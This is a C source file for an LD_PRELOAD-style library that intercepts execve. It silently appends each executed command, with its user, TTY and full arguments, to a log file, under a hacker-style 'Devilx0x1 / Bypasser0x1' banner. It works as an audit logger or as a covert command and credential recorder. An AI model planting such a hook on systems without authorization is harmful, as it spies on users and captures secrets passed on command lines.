#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <dlfcn.h>
#include <time.h>
#include <pwd.h>

#define LOG_FILE "/var/log/devil_logs.txt"  
static int (*original_execve)(const char *, char *const[], char *const[]) = NULL;


const char *get_tty() {
    char *tty = ttyname(STDIN_FILENO);
    if (!tty) tty = ttyname(STDOUT_FILENO);
    if (!tty) tty = ttyname(STDERR_FILENO);
    return (tty) ? tty : "hidden shell";
}


void log_command(const char *pathname, char *const argv[]) {
    FILE *logfile = fopen(LOG_FILE, "a");
    if (!logfile) {
        perror("Failed to open log file");
        return;
    }

    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    char timestamp[32];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", t);

    struct passwd *pw = getpwuid(geteuid());
    const char *user = (pw) ? pw->pw_name : "unknown";
    const char *tty = get_tty();  

    const char *cmd_name = strrchr(pathname, '/');
    cmd_name = (cmd_name) ? cmd_name + 1 : pathname;


    fprintf(logfile, "=============================================\n");
    fprintf(logfile, "Created by Devilx0x1 / Bypasser0x1\n");
    fprintf(logfile, "[%s] USER: %s | TTY: %s | CMD: %s", timestamp, user, tty, cmd_name);

    for (int i = 1; argv[i] != NULL; i++) {
        fprintf(logfile, " %s", argv[i]);
    }
    fprintf(logfile, "\n=============================================\n");

    fclose(logfile);
}


int execve(const char *pathname, char *const argv[], char *const envp[]) {
    if (!original_execve) {
        original_execve = dlsym(RTLD_NEXT, "execve");
    }

    log_command(pathname, argv);
    return original_execve(pathname, argv, envp);
}

